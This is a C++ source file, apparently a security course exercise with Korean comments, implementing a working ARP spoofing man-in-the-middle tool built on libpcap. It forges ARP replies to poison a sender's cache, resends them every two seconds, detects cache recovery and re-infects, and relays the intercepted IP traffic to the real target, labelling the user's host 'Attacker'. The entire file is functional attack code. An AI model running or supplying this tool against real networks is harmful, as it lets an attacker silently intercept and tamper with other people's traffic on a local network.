#include "pch.h"

#pragma pack(push, 1)

struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Flow {
    Ip senderIp;
    Mac senderMac;
    Ip targetIp;
    Mac targetMac;

    EthArpPacket infectPacket;
    EthArpPacket recoverPacket;

    time_t lastInfectTime; // 마지막 감염 시각

    Flow(Ip sIp, Mac sMac, Ip tIp, Mac tMac, Mac myMac) :
        senderIp(sIp), senderMac(sMac), targetIp(tIp), targetMac(tMac) {

        // 감염 패킷
        infectPacket.eth_.dmac_ = senderMac;
        infectPacket.eth_.smac_ = myMac;
        infectPacket.eth_.type_ = htons(EthHdr::Arp);
        infectPacket.arp_.hrd_ = htons(ArpHdr::ETHER);
        infectPacket.arp_.pro_ = htons(EthHdr::Ip4);
        infectPacket.arp_.hln_ = Mac::Size;
        infectPacket.arp_.pln_ = Ip::Size;
        infectPacket.arp_.op_  = htons(ArpHdr::Reply);
        infectPacket.arp_.smac_ = myMac;
        infectPacket.arp_.sip_  = htonl(targetIp);
        infectPacket.arp_.tmac_ = senderMac;
        infectPacket.arp_.tip_  = htonl(senderIp);

        // 복구 패킷 (정상 매핑)
        recoverPacket = infectPacket;
        recoverPacket.eth_.smac_ = targetMac;
        recoverPacket.arp_.smac_ = targetMac;
        recoverPacket.arp_.sip_  = htonl(targetIp);

        lastInfectTime = time(nullptr);
    }
};

std::list<Flow> flows;


void infectInterval(pcap_t* handle, std::list<Flow>& flows) {
    while (true) {
        for (auto& flow : flows) {
            pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&flow.infectPacket), sizeof(EthArpPacket));
            flow.lastInfectTime = time(nullptr);
        }
        sleep(2); // 2초 주기로 전송
    }
}

void detectRecovery(pcap_t* handle, std::list<Flow>& flows) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recv = (EthArpPacket*)packet;
        if (recv->eth_.type_ != htons(EthHdr::Arp)) continue;
        if (recv->arp_.op_ != htons(ArpHdr::Reply)) continue;

        Ip sip = ntohl(recv->arp_.sip_);
        Mac smac = recv->arp_.smac_;
        Mac tmac = recv->arp_.tmac_;

        for (auto& flow : flows) {
            if (flow.senderIp == sip && flow.senderMac != smac) {
                printf("[!] 감염 복구 감지됨. 재감염 시도\n");
                pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&flow.infectPacket), sizeof(EthArpPacket));
                flow.senderMac = smac; // MAC이 바뀐 경우 갱신
            }
        }
    }
}

void relayIpPacket(pcap_t* handle, const Mac& myMac, std::list<Flow>& flows) {
    struct pcap_pkthdr* header;
    const u_char* packet;

    while (true) {
        int res = pcap_next_ex(handle, &header, &packet);
        if (res <= 0) continue;

        EthHdr* eth = (EthHdr*)packet;
        if (eth->type() != EthHdr::Ip4) continue;

        for (auto& flow : flows) {
            if (eth->smac() == flow.senderMac && eth->dmac() == myMac) {
                // IP 패킷 릴레이
                u_char* relayPacket = (u_char*)malloc(header->caplen);
                memcpy(relayPacket, packet, header->caplen);
                EthHdr* relayEth = (EthHdr*)relayPacket;
                relayEth->smac_ = myMac;
                relayEth->dmac_ = flow.targetMac;

                pcap_sendpacket(handle, relayPacket, header->caplen);
                free(relayPacket);
                break;
            }
        }
    }
}

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

// 자신의 MAC 주소 획득
Mac getMyMac(const char* dev) {

    struct ifreq ifr;
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    ioctl(sock, SIOCGIFHWADDR, &ifr);
    close(sock);
    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

// 자신의 IP 주소 획득
Ip getMyIp(const char* dev) {
    struct ifaddrs* addrs;
    getifaddrs(&addrs);
    for (struct ifaddrs* addr = addrs; addr != nullptr; addr = addr->ifa_next) {
        if (addr->ifa_addr && addr->ifa_addr->sa_family == AF_INET &&
            std::string(addr->ifa_name) == dev) {
            Ip ip(ntohl(((struct sockaddr_in*)addr->ifa_addr)->sin_addr.s_addr));
            freeifaddrs(addrs);
            return ip;
        }
    }
    freeifaddrs(addrs);
    return Ip("0.0.0.0");
}

// ARP 요청으로 상대 MAC 획득
Mac getMacByIp(pcap_t* handle, Mac myMac, Ip myIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_  = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_  = htonl(myIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_  = htonl(targetIp);

    pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    struct pcap_pkthdr* header;
    const u_char* reply;

    //repeatedly send infected packets for deal with arp cashe recovery
    while (true) {
        int res = pcap_next_ex(handle, &header, &reply);
        if (res == 0) continue;
        if (res == -1 || res == -2) break;

        EthArpPacket* recv = (EthArpPacket*)reply;
        if (recv->eth_.type_ == htons(EthHdr::Arp) &&
            recv->arp_.op_ == htons(ArpHdr::Reply) &&
            Ip(ntohl(recv->arp_.sip_)) == targetIp) {
            return recv->arp_.smac_;
        }
    }
    return Mac("00:00:00:00:00:00");
}


int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live(%s) failed - %s\n", dev, errbuf);
        return -1;
    }

    Mac myMac = getMyMac(dev);
    Ip myIp = getMyIp(dev);
    printf("[*] Attacker MAC: %s\n", std::string(myMac).c_str());
    printf("[*] Attacker IP : %s\n", std::string(myIp).c_str());

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i + 1]);

        Mac senderMac = getMacByIp(handle, myMac, myIp, senderIp);
        Mac targetMac = getMacByIp(handle, myMac, myIp, targetIp);

        flows.emplace_back(senderIp, senderMac, targetIp, targetMac, myMac);
        printf("[+] Flow 등록 - sender:%s / target:%s\n", std::string(senderIp).c_str(), std::string(targetIp).c_str());
    }

    std::thread t1(infectInterval, handle, std::ref(flows));
    std::thread t2(detectRecovery, handle, std::ref(flows));
    std::thread t3(relayIpPacket, handle, myMac, std::ref(flows));

    t1.join(); t2.join(); t3.join();
    pcap_close(handle);
}
